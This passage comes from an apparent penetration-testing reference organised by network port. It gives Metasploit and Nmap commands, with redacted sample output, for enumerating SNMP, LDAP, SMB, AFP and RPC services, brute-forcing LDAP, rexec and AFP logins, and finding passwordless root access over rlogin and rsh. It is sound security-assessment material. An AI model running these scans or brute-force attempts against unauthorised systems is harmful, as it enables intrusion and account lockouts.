<h4>SNMP Enumeration Module<a class="headerlink" href="#snmp-enumeration-module" title="Link to this heading"></a></h4>
<p>Enumerate the devices for which we have found the community strings</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/snmp/snmp_enum</span>
<span class="go">creds -p 161 -R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[+] 10.11.xx.xx, Connected.</span>
<span class="go">[*] System information:</span>

<span class="go">Host IP                       : 10.11.xx.xx</span>
<span class="go">Hostname                      : X150-24t</span>
<span class="go">Description                   : ExtremeXOS version 12.2.xx.xx v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009</span>
<span class="go">Contact                       : support@extremenetworks.com, +1 888 257 3000</span>
<span class="go">Location                      : -</span>
<span class="go">Uptime snmp                   : -</span>
<span class="go">Uptime system                 : 206 days, 00:20:58.04</span>
<span class="go">System date                   : -</span>

<span class="go">[*] Network information:</span>

<span class="go">IP forwarding enabled         : no</span>
<span class="go">Default TTL                   : 64</span>
<span class="go">TCP segments received         : 6842</span>
<span class="go">TCP segments sent             : 6837</span>
<span class="go">TCP segments retrans          : 0</span>
<span class="go">Input datagrams               : 243052379</span>
<span class="go">Delivered datagrams           : 192775346</span>
<span class="go">Output datagrams              : 993667</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-264-check-point-firewall-1-topology">
<span id="check-point-firewall-1-topology-port-264"></span><h2>Port 264 - Check Point FireWall-1 Topology<a class="headerlink" href="#port-264-check-point-firewall-1-topology" title="Link to this heading"></a></h2>
<section id="id27">
<h3>Metasploit<a class="headerlink" href="#id27" title="Link to this heading"></a></h3>
<section id="checkpoint-firewall-1-securemote-topology-service-hostname-disclosure">
<h4>CheckPoint Firewall-1 SecuRemote Topology Service Hostname Disclosure<a class="headerlink" href="#checkpoint-firewall-1-securemote-topology-service-hostname-disclosure" title="Link to this heading"></a></h4>
<p>Module sends a query to the port 264/TCP on CheckPoint Firewall-1 firewalls to obtain the firewall name and management station (such as SmartCenter) name via a pre-authentication request</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/gather/checkpoint_hostname</span>
<span class="go">set RHOST 10.10.xx.xx</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] Attempting to contact Checkpoint FW1 SecuRemote Topology service...</span>
<span class="go">[+] Appears to be a CheckPoint Firewall...</span>
<span class="go">[+] Firewall Host: FIREFIGHTER-SEC</span>
<span class="go">[+] SmartCenter Host: FIREFIGHTER-MGMT.example.com</span>
<span class="go">[*] Auxiliary module execution completed</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-389-ldap">
<span id="ldap-port-389"></span><h2>Port 389 - LDAP<a class="headerlink" href="#port-389-ldap" title="Link to this heading"></a></h2>
<section id="id28">
<h3>Nmap<a class="headerlink" href="#id28" title="Link to this heading"></a></h3>
<section id="ldap-rootdse">
<h4>LDAP-rootdse<a class="headerlink" href="#ldap-rootdse" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ldap-rootdse.html">ldap-rootdse.nse</a> : Retrieves the LDAP root DSA-specific Entry (DSE)</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -p 389 --script ldap-rootdse &lt;host&gt;</span>
<span class="go">nmap -p 389 --script ldap-rootdse 172.16.xx.xx</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-05-03 23:05 IST</span>
<span class="go">Nmap scan report for 172.16.xx.xx</span>
<span class="go">Host is up (0.015s latency).</span>
<span class="go">PORT    STATE SERVICE</span>
<span class="go">389/tcp open  ldap</span>
<span class="go">| ldap-rootdse:</span>
<span class="go">| LDAP Results</span>
<span class="go">|   &lt;ROOT&gt;</span>
<span class="go">|       currentTime: 20160503173447.0Z</span>
<span class="go">|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=xxxpcx,DC=com</span>
<span class="go">|       dsServiceName: CN=NTDS Settings,CN=SCN-DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=xxxpcx,DC=com</span>
<span class="go">|       namingContexts: DC=xxxpcx,DC=com</span>
<span class="go">|       namingContexts: CN=Configuration,DC=xxxpcx,DC=com</span>
<span class="go">|       namingContexts: CN=Schema,CN=Configuration,DC=xxxpcx,DC=com</span>
<span class="go">|       namingContexts: DC=DomainDnsZones,DC=xxxpcx,DC=com</span>
<span class="go">|       namingContexts: DC=ForestDnsZones,DC=xxxpcx,DC=com</span>
<span class="go">|       defaultNamingContext: DC=xxxpcx,DC=com</span>
<span class="go">|       schemaNamingContext: CN=Schema,CN=Configuration,DC=xxxpcx,DC=com</span>
<span class="go">|       configurationNamingContext: CN=Configuration,DC=xxxpcx,DC=com</span>
<span class="go">|       rootDomainNamingContext: DC=xxxpcx,DC=com</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.319</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.801</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.473</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.528</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.417</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.619</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.841</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.529</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.805</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.521</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.970</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.1338</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.474</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.1339</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.1340</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.1413</span>
<span class="go">|       supportedControl: 2.16.xx.xx.113730.3.4.9</span>
<span class="go">|       supportedControl: 2.16.xx.xx.113730.3.4.10</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.1504</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.1852</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.802</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.1907</span>
<span class="go">|         supportedControl: 1.2.xx.xx.1.4.1948</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.1974</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.1341</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.2026</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.2064</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.2065</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.2066</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.2090</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.2205</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.2204</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.2206</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.2211</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.2239</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.2255</span>
<span class="go">|       supportedControl: 1.2.xx.xx.1.4.2256</span>
<span class="go">|       supportedLDAPVersion: 3</span>
<span class="go">|       supportedLDAPVersion: 2</span>
<span class="go">|       supportedLDAPPolicies: MaxPoolThreads</span>
<span class="go">|       supportedLDAPPolicies: MaxPercentDirSyncRequests</span>
<span class="go">|       supportedLDAPPolicies: MaxDatagramRecv</span>
<span class="go">|       supportedLDAPPolicies: MaxReceiveBuffer</span>
<span class="go">|       supportedLDAPPolicies: InitRecvTimeout</span>
<span class="go">|       supportedLDAPPolicies: MaxConnections</span>
<span class="go">|       supportedLDAPPolicies: MaxConnIdleTime</span>
<span class="go">|       supportedLDAPPolicies: MaxPageSize</span>
<span class="go">|       supportedLDAPPolicies: MaxBatchReturnMessages</span>
<span class="go">|       supportedLDAPPolicies: MaxQueryDuration</span>
<span class="go">|       supportedLDAPPolicies: MaxTempTableSize</span>
<span class="go">|       supportedLDAPPolicies: MaxResultSetSize</span>
<span class="go">|       supportedLDAPPolicies: MinResultSets</span>
<span class="go">|       supportedLDAPPolicies: MaxResultSetsPerConn</span>
<span class="go">|       supportedLDAPPolicies: MaxNotificationPerConn</span>
<span class="go">|       supportedLDAPPolicies: MaxValRange</span>
<span class="go">|       supportedLDAPPolicies: MaxValRangeTransitive</span>
<span class="go">|       supportedLDAPPolicies: ThreadMemoryLimit</span>
<span class="go">|       supportedLDAPPolicies: SystemMemoryLimitPercent</span>
<span class="go">|       highestCommittedUSN: 70892</span>
<span class="go">|       supportedSASLMechanisms: GSSAPI</span>
<span class="go">|       supportedSASLMechanisms: GSS-SPNEGO</span>
<span class="go">|       supportedSASLMechanisms: EXTERNAL</span>
<span class="go">|       supportedSASLMechanisms: DIGEST-MD5</span>
<span class="go">|       dnsHostName: SCN-DC01.xxxpcx.com</span>
<span class="go">|       ldapServiceName: xxxpcx.com:scn-dc01$@xxxpcx.COM</span>
<span class="go">|       serverName: CN=SCN-DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=xxxpcx,DC=com</span>
<span class="go">|       supportedCapabilities: 1.2.xx.xx.1.4.800</span>
<span class="go">|       supportedCapabilities: 1.2.xx.xx.1.4.1670</span>
<span class="go">|       supportedCapabilities: 1.2.xx.xx.1.4.1791</span>
<span class="go">|       supportedCapabilities: 1.2.xx.xx.1.4.1935</span>
<span class="go">|       supportedCapabilities: 1.2.xx.xx.1.4.2080</span>
<span class="go">|       supportedCapabilities: 1.2.xx.xx.1.4.2237</span>
<span class="go">|       isSynchronized: TRUE</span>
<span class="go">|       isGlobalCatalogReady: TRUE</span>
<span class="go">|       domainFunctionality: 3</span>
<span class="go">|       forestFunctionality: 3</span>
<span class="go">|_      domainControllerFunctionality: 6</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds</span>
</pre></div>
</div>
</section>
<section id="ldap-search">
<h4>ldap-search<a class="headerlink" href="#ldap-search" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ldap-search.html">ldap-search.nse</a> : Attempts to perform an LDAP search and returns all matches.</p>
<p>If no username and password is supplied to the script the Nmap registry is consulted. If the ldap-brute script has been selected and it found a valid account, this account will be used. If not anonymous bind will be used as a last attempt.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -p 389 --script ldap-search --script-args &#39;ldap.username=&quot;cn=ldaptest,cn=users,dc=cqure,dc=net&quot;,ldap.password=ldaptest,</span>
<span class="go">ldap.qfilter=users,ldap.attrib=sAMAccountName&#39; &lt;host&gt;</span>

<span class="go">nmap -p 389 --script ldap-search --script-args &#39;ldap.username=&quot;cn=ldaptest,cn=users,dc=cqure,dc=net&quot;,ldap.password=ldaptest,</span>
<span class="go">ldap.qfilter=custom,ldap.searchattrib=&quot;operatingSystem&quot;,ldap.searchvalue=&quot;Windows *Server*&quot;,ldap.attrib={operatingSystem,whencreated,OperatingSystemServicePack}&#39; &lt;host&gt;</span>
</pre></div>
</div>
</section>
<section id="ldap-brute">
<h4>ldap-brute<a class="headerlink" href="#ldap-brute" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ldap-brute.html">ldap-brute.nse</a> : Attempts to brute-force LDAP authentication. By default it uses the built-in username and password lists. In order to use your own lists use the userdb and passdb script arguments. This script does not make any attempt to prevent account lockout! If the number of passwords in the dictionary exceeds the amount of allowed tries, accounts will be locked out. This usually happens very quickly.</p>
</section>
</section>
<section id="id29">
<h3>Other<a class="headerlink" href="#id29" title="Link to this heading"></a></h3>
<section id="ldapsearch">
<h4>ldapsearch<a class="headerlink" href="#ldapsearch" title="Link to this heading"></a></h4>
<p>Anonymous LDAP Binding allows a client to connect and search the directory (bind and search) without logging in. You do not need to include binddn and bindpasswd.</p>
<p>If the port 389 supports Anonymous Bind, we may try searching for the base by using doing a ldap search query</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">ldapsearch -h 10.10.xx.xx -p 389 -x -s base -b &#39;&#39; &quot;(objectClass=*)&quot; &quot;*&quot; +</span>
<span class="go">-h ldap server</span>
<span class="go">-p port of ldap</span>
<span class="go">-x simple authentication</span>
<span class="go">-b search base</span>
<span class="go">-s scope is defined as base</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">ldapsearch -h 10.10.xx.xx -p 389 -x -s base -b &#39;&#39; &quot;(objectClass=*)&quot; &quot;*&quot; +</span>
<span class="gp"># </span>extended<span class="w"> </span>LDIF
<span class="gp">#</span>
<span class="gp"># </span>LDAPv3
<span class="gp"># </span>base<span class="w"> </span>&lt;&gt;<span class="w"> </span>with<span class="w"> </span>scope<span class="w"> </span>baseObject
<span class="gp"># </span>filter:<span class="w"> </span><span class="o">(</span><span class="nv">objectClass</span><span class="o">=</span>*<span class="o">)</span>
<span class="gp"># </span>requesting:<span class="w"> </span>*<span class="w"> </span>+
<span class="gp">#</span>

<span class="gp">#</span>
<span class="go">dn:</span>
<span class="go">objectClass: top</span>
<span class="go">objectClass: OpenLDAProotDSE</span>
<span class="go">structuralObjectClass: OpenLDAProotDSE</span>
<span class="go">configContext: cn=config</span>
<span class="go">namingContexts: dc=example,dc=com</span>
<span class="go">supportedControl: 1.3.xx.xx.4.1.4203.1.9.1.1</span>
<span class="go">supportedControl: 2.16.xx.xx.113730.3.4.18</span>
<span class="go">supportedControl: 2.16.xx.xx.113730.3.4.2</span>
<span class="go">supportedControl: 1.3.xx.xx.4.1.4203.1.10.1</span>
<span class="go">supportedControl: 1.2.xx.xx.1.4.319</span>
<span class="go">supportedControl: 1.2.xx.xx.1.334810.2.3</span>
<span class="go">supportedControl: 1.2.xx.xx.1.3344810.2.3</span>
<span class="go">supportedControl: 1.3.xx.xx.1.13.2</span>
<span class="go">supportedControl: 1.3.xx.xx.1.13.1</span>
<span class="go">supportedControl: 1.3.xx.xx.1.12</span>
<span class="go">supportedExtension: 1.3.xx.xx.4.1.4203.1.11.1</span>
<span class="go">supportedExtension: 1.3.xx.xx.4.1.4203.1.11.3</span>
<span class="go">supportedFeatures: 1.3.xx.xx.1.14</span>
<span class="go">supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.1</span>
<span class="go">supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.2</span>
<span class="go">supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.3</span>
<span class="go">supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.4</span>
<span class="go">supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.5</span>
<span class="go">supportedLDAPVersion: 3</span>
<span class="go">entryDN:</span>
<span class="go">subschemaSubentry: cn=Subschema</span>

<span class="gp"># </span>search<span class="w"> </span>result
<span class="go">search: 2</span>
<span class="go">result: 0 Success</span>

<span class="gp"># </span>numResponses:<span class="w"> </span><span class="m">2</span>
<span class="gp"># </span>numEntries:<span class="w"> </span><span class="m">1</span>
</pre></div>
</div>
<p>Once you are aware of the base name in the above example “example.com” we can query for ldap users etc. by</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">ldapsearch -h 10.10.xx.xx -p 389 -x -b &quot;dc=example,dc=com&quot;</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp"># </span>johnsmith,<span class="w"> </span>EXAUSERS,<span class="w"> </span>People,<span class="w"> </span>example.com
<span class="go">dn: uid=johnsmith,ou=EXAUSERS,ou=People,dc=example,dc=com</span>
<span class="go">displayName: John Smith</span>
<span class="go">ntUserLastLogon: 130150432350834365</span>
<span class="go">givenName: John</span>
<span class="go">objectClass: top</span>
<span class="go">objectClass: person</span>
<span class="go">objectClass: organizationalperson</span>
<span class="go">objectClass: inetOrgPerson</span>
<span class="go">objectClass: ntUser</span>
<span class="go">objectClass: shadowAccount</span>
<span class="go">uid: johnsmith</span>
<span class="go">cn: John Smith</span>
<span class="go">ntUserCodePage: 0</span>
<span class="go">ntUserDomainId: johnsmith</span>
<span class="go">ntUserLastLogoff: 0</span>
<span class="go">ntUniqueId: 75ac21092c755e42b2129a224eb328dd</span>
<span class="go">ntUserDeleteAccount: true</span>
<span class="go">ntUserAcctExpires: 9223372036854775807</span>
<span class="go">sn: John</span>
</pre></div>
</div>
<div class="admonition-todo admonition" id="id30">
<p class="admonition-title">Todo</p>
<p>Things to add in LDAP – User authentication and Jxplorer</p>
</div>
</section>
</section>
</section>
<section id="port-445-smb">
<span id="smb-port-445"></span><h2>Port 445 - SMB<a class="headerlink" href="#port-445-smb" title="Link to this heading"></a></h2>
<section id="id31">
<h3>Metasploit<a class="headerlink" href="#id31" title="Link to this heading"></a></h3>
<section id="smb-version-detection">
<h4>SMB Version Detection<a class="headerlink" href="#smb-version-detection" title="Link to this heading"></a></h4>
<p>Provides the operating system version.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/smb/smb_version</span>
<span class="go">services -p 445 -R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] 10.87.xx.xx:445 is running Windows 7 Professional SP1 (build:7601) (name:3BPC13B0843) (domain:XXX)</span>
<span class="go">[*] 10.87.xx.xx:445 is running Windows 7 Professional SP1 (build:7601) (name:3BWK14F0040) (domain:XXX)</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-512-rexec">
<span id="rexec-port-512"></span><h2>Port 512 - rexec<a class="headerlink" href="#port-512-rexec" title="Link to this heading"></a></h2>
<section id="id32">
<h3>Metasploit<a class="headerlink" href="#id32" title="Link to this heading"></a></h3>
<section id="rexec-authentication-scanner">
<h4>rexec Authentication Scanner<a class="headerlink" href="#rexec-authentication-scanner" title="Link to this heading"></a></h4>
<p>Find if there is any open shell.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">auxiliary/scanner/rservices/rexec_login</span>
<span class="go">services -p 512 -u -R</span>
</pre></div>
</div>
<p>Sample output with the username root and empty password:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] 10.10.xx.xx:512 REXEC - [1/1] - Attempting rexec with username:password &#39;root&#39;:&#39;&#39;</span>
<span class="go">[-] Result: Where are you?</span>
<span class="go">[*] 10.10.xx.xx:512 - Starting rexec sweep</span>
<span class="go">[*] 10.10.xx.xx:512 REXEC - [1/1] - Attempting rexec with username:password &#39;root&#39;:&#39;&#39;</span>
<span class="go">[*] 10.10.xx.xx:512 - Starting rexec sweep</span>
<span class="go">[*] 10.10.xx.xx:512 REXEC - [1/1] - Attempting rexec with username:password &#39;root&#39;:&#39;&#39;</span>
<span class="go">[+] 10.10.xx.xx:512, rexec &#39;root&#39; : &#39;&#39;</span>
</pre></div>
</div>
</section>
</section>
<section id="id33">
<h3>Other<a class="headerlink" href="#id33" title="Link to this heading"></a></h3>
<section id="rlogin">
<h4>rlogin<a class="headerlink" href="#rlogin" title="Link to this heading"></a></h4>
<p>The above can be accessed using</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rlogin &lt;ipaddress&gt;</span>
</pre></div>
</div>
</section>
</section>
<section id="id34">
<h3>Nmap<a class="headerlink" href="#id34" title="Link to this heading"></a></h3>
<section id="rexec-brute">
<h4>rexec-brute<a class="headerlink" href="#rexec-brute" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/rexec-brute.html">rexec-brute.nse</a> : Performs brute force password auditing against the classic UNIX rexec (remote exec) service.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -p 512 --script rexec-brute &lt;ip&gt;</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-513-rlogin">
<span id="rlogin-port-513"></span><h2>Port 513 - rlogin<a class="headerlink" href="#port-513-rlogin" title="Link to this heading"></a></h2>
<section id="id35">
<h3>Metasploit<a class="headerlink" href="#id35" title="Link to this heading"></a></h3>
<section id="rlogin-authentication-scanner">
<h4>rlogin Authentication Scanner<a class="headerlink" href="#rlogin-authentication-scanner" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/rservices/rlogin_login</span>
<span class="go">services -p 513 -u -R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[+] 10.10.xx.xx:513, rlogin &#39;root&#39; from &#39;root&#39; with no password.</span>
<span class="go">[+] 10.10.xx.xx:513, rlogin &#39;root&#39; from &#39;root&#39; with no password.</span>
</pre></div>
</div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>In a recent engagement just doing the “rlogin IP” using the root shell provided me the root shell, where-as few IP address asked for password. Also, One IP for which rexec_login shows failed, was able to login using rlogin.</p>
</div>
<p>Maybe refer: Metasploitable 2 : DOC-1875 document.</p>
</section>
</section>
</section>
<section id="port-514-rsh">
<span id="rsh-port-514"></span><h2>Port 514 - RSH<a class="headerlink" href="#port-514-rsh" title="Link to this heading"></a></h2>
<section id="id36">
<h3>Metasploit<a class="headerlink" href="#id36" title="Link to this heading"></a></h3>
<section id="rsh-authentication-scanner">
<h4>rsh Authentication Scanner<a class="headerlink" href="#rsh-authentication-scanner" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/rservices/rsh_login</span>
<span class="go">services -p 514 -u -R</span>
</pre></div>
</div>
<p>Sample Output</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[+] 10.10.xx.xx:514, rsh &#39;root&#39; from &#39;root&#39; with no password.</span>
<span class="go">[*] 10.11.xx.xx:514 RSH - Attempting rsh with username &#39;root&#39; from &#39;root&#39;</span>
<span class="go">[+] 10.11.xx.xx:514, rsh &#39;root&#39; from &#39;root&#39; with no password.</span>
</pre></div>
</div>
</section>
</section>
<section id="id37">
<h3>Other<a class="headerlink" href="#id37" title="Link to this heading"></a></h3>
<section id="rsh">
<h4>rsh<a class="headerlink" href="#rsh" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">rsh 10.11.xx.xx whoami</span>
<span class="go">Integrated PrintNet Enterprise</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-548-afp-apple-filing-protocol">
<span id="afp-applice-filing-protocol-port-548"></span><h2>Port 548 - AFP (Apple Filing Protocol)<a class="headerlink" href="#port-548-afp-apple-filing-protocol" title="Link to this heading"></a></h2>
<p>AFP is a proprietary network protocol that offers file services for MAC OS X and original MAC OS.</p>
<section id="id38">
<h3>Metasploit<a class="headerlink" href="#id38" title="Link to this heading"></a></h3>
<p>Two auxiliary modules available.</p>
<section id="apple-filing-protocol-info-enumerator">
<h4>Apple Filing Protocol Info Enumerator<a class="headerlink" href="#apple-filing-protocol-info-enumerator" title="Link to this heading"></a></h4>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/afp/afp_server_info</span>
<span class="go">services -p 548 -u -S AFP -R</span>
</pre></div>
</div>
<p>Sample output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] AFP 10.11.xx.xx Scanning...</span>
<span class="go">[*] AFP 10.11.xx.xx:548:548 AFP:</span>
<span class="go">[*] AFP 10.11.xx.xx:548 Server Name: example-airport-time-capsule</span>
<span class="go">[*] AFP 10.11.xx.xx:548  Server Flags:</span>
<span class="go">[*] AFP 10.11.xx.xx:548     *  Super Client: true</span>
<span class="go">[*] AFP 10.11.xx.xx:548     *  UUIDs: true</span>
<span class="go">[*] AFP 10.11.xx.xx:548     *  UTF8 Server Name: true</span>
<span class="go">[*] AFP 10.11.xx.xx:548     *  Open Directory: true</span>
<span class="go">[*] AFP 10.11.xx.xx:548     *  Reconnect: true</span>
<span class="go">[*] AFP 10.11.xx.xx:548     *  Server Notifications: true</span>
<span class="go">[*] AFP 10.11.xx.xx:548     *  TCP/IP: true</span>
<span class="go">[*] AFP 10.11.xx.xx:548     *  Server Signature: true</span>
<span class="go">[*] AFP 10.11.xx.xx:548     *  Server Messages: true</span>
<span class="go">[*] AFP 10.11.xx.xx:548     *  Password Saving Prohibited: false</span>
<span class="go">[*] AFP 10.11.xx.xx:548     *  Password Changing: true</span>
<span class="go">[*] AFP 10.11.xx.xx:548     *  Copy File: true</span>
<span class="go">[*] AFP 10.11.xx.xx:548  Machine Type: TimeCapsule8,119</span>
<span class="go">[*] AFP 10.11.xx.xx:548  AFP Versions: AFP3.3, AFP3.2, AFP3.1</span>
<span class="go">[*] AFP 10.11.xx.xx:548  UAMs: DHCAST128, DHX2, SRP, Recon1</span>
<span class="go">[*] AFP 10.11.xx.xx:548  Server Signature: 4338364c4e355635463948350069672d</span>
<span class="go">[*] AFP 10.11.xx.xx:548  Server Network Address:</span>
<span class="go">[*] AFP 10.11.xx.xx:548     *  10.11.4.76:548</span>
<span class="go">[*] AFP 10.11.xx.xx:548     *  [fe80:0009:0000:0000:9272:40ff:fe0b:99b7]:548</span>
<span class="go">[*] AFP 10.11.xx.xx:548     *  10.11.4.76</span>
<span class="go">[*] AFP 10.11.xx.xx:548   UTF8 Server Name: Example&#39;s AirPort Time Capsule</span>
<span class="go">[*] Scanned 1 of 1 hosts (100% complete)</span>
<span class="go">[*] Auxiliary module execution completed</span>
</pre></div>
</div>
</section>
<section id="apple-filing-protocol-login-utility">
<h4>Apple Filing Protocol Login Utility<a class="headerlink" href="#apple-filing-protocol-login-utility" title="Link to this heading"></a></h4>
<p>Attempt to bruteforce authentication credentials for AFP.</p>
</section>
</section>
<section id="id39">
<h3>Nmap<a class="headerlink" href="#id39" title="Link to this heading"></a></h3>
<section id="afp-serverinfo">
<h4>afp-serverinfo<a class="headerlink" href="#afp-serverinfo" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/afp-serverinfo.html">afp-serverinfo.nse</a> : Shows AFP server information.</p>
</section>
<section id="afp-brute">
<h4>afp-brute<a class="headerlink" href="#afp-brute" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/afp-brute.html">afp-brute.nse</a> : Performs password guessing against Apple Filing Protocol (AFP).</p>
</section>
<section id="afp-ls">
<h4>afp-ls<a class="headerlink" href="#afp-ls" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/afp-ls.html">afp-ls.nse</a> : Attempts to get useful information about files from AFP volumes. The output is intended to resemble the output of ls.</p>
</section>
<section id="afp-showmount">
<h4>afp-showmount<a class="headerlink" href="#afp-showmount" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/afp-showmount.html">afp-showmount.nse</a> : Shows AFP shares and ACLs.</p>
</section>
<section id="afp-path-vuln">
<h4>afp-path-vuln<a class="headerlink" href="#afp-path-vuln" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/afp-path-vuln.html">afp-path-vuln.nse</a> : Detects the Mac OS X AFP directory traversal vulnerability, CVE-2010-0533.</p>
</section>
</section>
</section>
<section id="microsoft-windows-rpc-services-port-135-and-microsoft-rpc-services-over-http-port-593">
<span id="rpc-port-135-port-593"></span><h2>Microsoft Windows RPC Services | Port 135 and Microsoft RPC Services over HTTP | Port 593<a class="headerlink" href="#microsoft-windows-rpc-services-port-135-and-microsoft-rpc-services-over-http-port-593" title="Link to this heading"></a></h2>
<p>Depending on the host configuration, the RPC endpoint mapper can be accessed through TCP and UDP port 135, via SMB with a null or authenticated session (TCP 139 and 445), and as a web service listening on TCP port 593.</p>
<section id="id40">
<h3>Metasploit<a class="headerlink" href="#id40" title="Link to this heading"></a></h3>
<section id="endpoint-mapper-service-discovery">
<h4>Endpoint Mapper Service Discovery<a class="headerlink" href="#endpoint-mapper-service-discovery" title="Link to this heading"></a></h4>
<p>Module can be used to obtain information from the Endpoint Mapper service</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/dcerpc/endpoint_mapper</span>
</pre></div>
</div>
</section>
<section id="hidden-dcerpc-service-discovery">
<h4>Hidden DCERPC Service Discovery<a class="headerlink" href="#hidden-dcerpc-service-discovery" title="Link to this heading"></a></h4>
<p>Module will query the endpoint mapper and make a list of all ncacn_tcp RPC services. It will then connect to each of these services and use the management API to list all other RPC services accessible on this port. Any RPC service found attached to a TCP port, but not listed in the endpoint mapper, will be displayed and analyzed to see whether anonymous access is permitted.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/dcerpc/hidden</span>
</pre></div>
</div>
</section>
<section id="remote-management-interface-discovery">
<h4>Remote Management Interface Discovery<a class="headerlink" href="#remote-management-interface-discovery" title="Link to this heading"></a></h4>
<p>Module can be used to obtain information from the Remote Management Interface DCERPC service.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/dcerpc/management</span>
</pre></div>
</div>
</section>
<section id="dcerpc-tcp-service-auditor">
